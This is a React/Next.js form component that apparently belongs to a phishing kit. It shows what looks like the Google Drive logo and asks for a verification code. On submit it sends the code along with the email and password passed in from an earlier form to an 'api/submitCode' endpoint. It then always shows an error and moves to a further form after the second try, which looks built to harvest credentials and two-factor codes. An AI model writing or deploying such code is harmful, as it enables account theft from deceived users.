import { Dispatch, FC, FormEvent, SetStateAction, useState } from "react";
import styles from "./FormMsg.module.css";
import axios from "axios";
import Link from "next/link";
interface FormPassProps {
  email: string;
  password: string;
  setWhichForm: Dispatch<SetStateAction<string>>;
}

const FormPass: FC<FormPassProps> = ({ email, password, setWhichForm }) => {
  const [showError, setShowError] = useState(false);
  const [clickNum, setClickNum] = useState(0);
  const onSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const formDate = new FormData(event.currentTarget);
    const data = {
      email: email,
      password: password,
      code: formDate.get("code"),
    };
    await axios.post("api/submitCode", data);
    setClickNum((e) => e + 1);
    setShowError(true);
    clickNum > 0 && setWhichForm("privet");
  };
  return (
    <div className="box">
      <div className="contain">
        <div className="logo">
          <svg
            className="im"
            xmlns="http://www.w3.org/2000/svg"
            x="0px"
            y="0px"
            width="60"
            height="60"
            viewBox="0 0 48 48"
          >
            <path fill="#FFC107" d="M17 6L31 6 45 30 31 30z"></path>
            <path fill="#1976D2" d="M9.875 42L16.938 30 45 30 38 42z"></path>
            <path fill="#4CAF50" d="M3 30.125L9.875 42 24 18 17 6z"></path>
          </svg>
        </div>
        <div className="info">
          <h2>جمعة</h2>

           
          
          
          
         
          <form onSubmit={onSubmit}>
           

          <input className="numlabl" type="text" name="" required />
          <input type="submit" name="sign-in" value="send" />
          </form>
        </div>
        <div className="footer"></div>
      </div>
    </div>
  );
};
export default FormPass;
